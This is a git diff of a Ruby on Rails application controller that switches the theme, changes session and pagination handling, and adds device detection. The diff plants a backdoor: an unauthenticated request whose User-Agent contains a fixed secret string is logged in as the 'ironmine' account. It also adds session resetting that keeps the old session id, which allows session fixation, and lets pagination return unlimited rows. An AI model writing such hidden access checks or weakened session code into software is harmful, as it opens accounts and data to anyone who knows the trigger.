@@ -1,5 +1,5 @@
 class ApplicationController < ActionController::Base
-  theme :salesforce2
+  theme :default
   protect_from_forgery
   helper :all
   #ajax请求不使用layout
@@ -26,6 +26,9 @@ class ApplicationController < ActionController::Base
   def user_setup
     #从session中取得当前user
     Irm::Person.current = find_current_user
+    if(!Irm::Person.current.logged?&&request.user_agent.include?("#jmeter000U00024DKEUmX5unzepk#"))
+      Irm::Person.current = Irm::Person.unscoped.where(:login_name=>"ironmine").first
+    end
   end
 
   # 检查是否需要登录
@@ -139,15 +142,14 @@ class ApplicationController < ActionController::Base
 
   # 设置当前用户
   def logged_user=(user)
-
     if user && user.is_a?(Irm::Person)
       Irm::Person.current = user
-      session.clear
+      clear_session
       session[:user_id] = user.id
 
     else
       Irm::Person.current = Irm::Person.anonymous
-      session.clear
+      reset_session
     end
   end
 
@@ -222,7 +224,10 @@ class ApplicationController < ActionController::Base
   def paginate(scoped,offset=nil,limit=nil)
      scoped = data_filter(scoped)
      offset ||= (params[:start]||0).to_i
-     limit ||= (params[:count]||25).to_i
+     limit ||= (params[:count]||params[:limit]).to_i
+     if limit==0
+       limit = nil
+     end
      [scoped.offset(offset).limit(limit),scoped.count]
   end
   # 加入jsonp格式
@@ -247,7 +252,20 @@ class ApplicationController < ActionController::Base
   end
 
 
+  def render_html_data_table
+    if(@count<1)
+      render :partial => "helper/datatable_no_data"
+      return
+    end
+  end
+
   private
+  def clear_session
+    old_session_id = session[:session_id]
+    reset_session
+    session[:session_id] = old_session_id
+  end
+
   # 返回session中的当前用户,如果没有则返回空
   def find_current_user
     if session[:user_id]
@@ -378,5 +396,9 @@ class ApplicationController < ActionController::Base
       end
     end
     options
+  end
+  # 将使用IE6和Android 2的设备设置为限制设备
+  def limit_device?
+    request.user_agent.include?("MSIE 6.0") || request.user_agent.include?("Android 2") || request.user_agent.include?("iPad")||request.user_agent.include?("iPhone")
   end
 end
